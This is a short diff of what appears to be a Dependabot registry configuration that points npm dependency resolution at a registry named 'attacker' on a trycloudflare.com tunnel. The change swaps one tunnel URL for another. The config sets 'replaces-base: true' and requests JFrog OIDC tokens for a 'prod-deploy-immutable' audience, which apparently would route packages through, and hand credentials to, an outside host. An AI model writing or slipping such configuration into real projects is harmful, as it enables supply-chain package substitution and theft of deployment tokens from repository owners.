@@ -2,7 +2,7 @@ version: 2
 registries:
   attacker:
     type: npm-registry
-    url: https://lunch-viewpicture-pressed-aaron.trycloudflare.com/artifactory/api/npm/npm-probe
+    url: https://deliver-bufing-revision-legitimate.trycloudflare.com/artifactory/api/npm/npm-probe
     jfrog-oidc-provider-name: anything
     audience: prod-deploy-immutable
     replaces-base: true
